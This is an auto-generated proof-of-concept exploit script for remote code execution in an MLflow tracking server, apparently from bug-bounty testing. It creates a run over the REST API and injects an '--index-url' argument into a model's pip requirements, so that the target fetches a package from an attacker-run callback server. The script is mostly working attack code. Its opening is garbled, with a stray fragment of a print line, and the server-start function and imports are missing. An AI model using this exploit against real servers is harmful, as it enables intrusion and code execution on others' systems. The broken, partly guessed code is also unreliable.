#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: rce-014
# Auto-generated — run with: python3 mlflow-rce-014-poc.py
#
[*] Malicious package server started on {CALLBACK_HOST}:{CALLBACK_PORT}")
    return server

def trigger_exploit(target_url, callback_url):
    """
    Trigger the RCE by logging a model with a malicious pip requirement.
    The requirement points to a package on our malicious server.
    """
    # The malicious requirement: use --index-url to point to our server
    # and specify a package name that will be fetched from there.
    # In a real attack, the package would contain malicious code.
    # Here we use a benign package name that will fail to install but trigger the dry-run.
    malicious_requirement = f"--index-url {callback_url} malicious"
    
    # Prepare the MLflow API call to log a model with the malicious requirement.
    # We use the REST API directly to avoid needing the MLflow client.
    # The endpoint is /api/2.0/mlflow/runs/log-model.
    # However, the actual vulnerability is in save_model/log_model, which is called
    # when logging a model. We can trigger it by creating a run and logging a model.
    
    # First, create a run
    create_run_url = f"{target_url}/api/2.0/mlflow/runs/create"
    run_data = {"experiment_id": "0"}
    try:
        resp = requests.post(create_run_url, json=run_data)
        resp.raise_for_status()
        run_id = resp.json()["run"]["info"]["run_id"]
        print(f"[+] Created run: {run_id}")
    except Exception as e:
        print(f"[-] Failed to create run: {e}")
        return False
    
    # Now log a model with the malicious pip_requirements
    log_model_url = f"{target_url}/api/2.0/mlflow/runs/log-model"
    # We need to provide a model artifact. For simplicity, we use a dummy model.
    # In practice, the model would be a valid MLflow model.
    model_data = {
        "run_id": run_id,
        "model_path": "model",
        "pip_requirements": [malicious_requirement],
        # Other required fields (signature, etc.) can be omitted for PoC
    }
    try:
        resp = requests.post(log_model_url, json=model_data)
        # The request may fail due to validation, but the vulnerability is triggered
        # during the save_model call which happens before the response.
        print(f"[*] Log model response: {resp.status_code} {resp.text}")
    except Exception as e:
        print(f"[-] Failed to log model: {e}")
        return False
    
    # Check if the payload command was executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] Payload executed successfully!")
        return True
    else:
        print("[-] Payload may not have executed. Check server logs.")
        return False

def main():
    parser = argparse.ArgumentParser(description="MLflow RCE PoC")
    parser.add_argument("--target", default=f"http://{TARGET_HOST}:{TARGET_PORT}",
                        help="Target MLflow tracking server URL")
    parser.add_argument("--callback", default=f"http://{CALLBACK_HOST}:{CALLBACK_PORT}",
                        help="Callback URL for malicious package server")
    args = parser.parse_args()
    
    # Start malicious package server
    server = start_malicious_server()
    
    # Give server a moment to start
    time.sleep(0.5)
    
    # Trigger the exploit
    success = trigger_exploit(args.target, args.callback)
    
    # Cleanup
    server.shutdown()
    
    if success:
        print("[+] Exploit succeeded!")
    else:
        print("[-] Exploit may have failed. Check target and callback server.")

if __name__ == "__main__":
    main()
